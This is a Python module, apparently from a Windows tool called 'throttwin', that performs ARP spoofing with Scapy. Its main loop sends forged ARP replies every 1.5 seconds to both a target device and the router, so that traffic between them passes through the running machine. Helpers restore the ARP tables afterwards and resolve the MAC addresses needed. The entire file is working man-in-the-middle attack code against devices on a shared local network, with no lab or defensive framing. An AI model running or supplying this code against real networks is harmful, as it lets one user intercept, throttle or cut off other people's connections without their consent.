import time
import logging
import threading

log = logging.getLogger("throttwin")


def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                   my_mac, stop_event, status=None):
    """
    Continuously send forged ARP replies to poison:
      - target device: telling it our MAC is the router
      - router: telling it our MAC is the target device
    Uses Scapy on Windows via Npcap.
    """
    try:
        from scapy.all import Ether, ARP, sendp, conf as scapy_conf
        from .network import get_scapy_interface
        npf_iface = get_scapy_interface(interface)

        # Packet: tell target "I am the router"
        pkt_to_target = (
            Ether(dst=target_mac, src=my_mac) /
            ARP(op=2, pdst=target_ip, hwdst=target_mac,
                psrc=router_ip, hwsrc=my_mac)
        )
        # Packet: tell router "I am the target"
        pkt_to_router = (
            Ether(dst=router_mac, src=my_mac) /
            ARP(op=2, pdst=router_ip, hwdst=router_mac,
                psrc=target_ip, hwsrc=my_mac)
        )

        log.info(f"ARP spoof started: {target_ip} ({target_mac})")

        while not stop_event.is_set():
            try:
                sendp(pkt_to_target, iface=npf_iface, verbose=0)
                sendp(pkt_to_router, iface=npf_iface, verbose=0)
            except Exception as e:
                log.debug(f"ARP send error for {target_ip} (interface may be reconnecting): {e}")
                npf_iface = get_scapy_interface(interface)
            stop_event.wait(1.5)

    except Exception as e:
        log.debug(f"ARP spoof loop exception for {target_ip}: {e}")
    finally:
        # Restore ARP tables on exit
        _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac)
        log.info(f"ARP spoof stopped and restored: {target_ip}")


def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac):
    """Send gratuitous ARP replies to restore correct MAC mappings."""
    try:
        from scapy.all import Ether, ARP, sendp
        from .network import get_scapy_interface
        npf_iface = get_scapy_interface(interface)

        # Tell target: router's real MAC
        restore_target = (
            Ether(dst=target_mac, src=router_mac) /
            ARP(op=2, pdst=target_ip, hwdst=target_mac,
                psrc=router_ip, hwsrc=router_mac)
        )
        # Tell router: target's real MAC
        restore_router = (
            Ether(dst=router_mac, src=target_mac) /
            ARP(op=2, pdst=router_ip, hwdst=router_mac,
                psrc=target_ip, hwsrc=target_mac)
        )

        for _ in range(4):
            sendp(restore_target, iface=npf_iface, verbose=0)
            sendp(restore_router, iface=npf_iface, verbose=0)
            time.sleep(0.2)

    except Exception as e:
        log.warning(f"ARP restore failed for {target_ip}: {e}")


def get_router_mac(router_ip, interface):
    """
    Resolve the router's MAC address via native Win32 SendARP, ARP cache, or Scapy.
    """
    from .network import win_send_arp, resolve_mac_from_arp_cache, get_scapy_interface

    # 1. Native Win32 SendARP
    mac = win_send_arp(router_ip)
    if mac and mac not in ("00:00:00:00:00:00", "ff:ff:ff:ff:ff:ff"):
        return mac

    # 2. Windows ARP Cache
    mac = resolve_mac_from_arp_cache(router_ip)
    if mac:
        return mac

    # 3. Scapy ARP Request
    try:
        from scapy.all import Ether, ARP, srp
        npf_iface = get_scapy_interface(interface)
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=router_ip),
            iface=npf_iface, timeout=1.5, verbose=0, retry=1
        )
        if ans:
            return ans[0][1][Ether].src.lower()
    except Exception as e:
        log.warning(f"Could not resolve router MAC for {router_ip}: {e}")
    return None


def get_my_mac(interface):
    """Get this machine's MAC address for the given interface."""
    from .network import get_interface_ip_and_mac
    _, mac = get_interface_ip_and_mac(interface)
    if mac:
        return mac

    try:
        from scapy.all import get_if_hwaddr
        from .network import get_scapy_interface
        return get_if_hwaddr(get_scapy_interface(interface)).lower()
    except Exception:
        pass
    return None
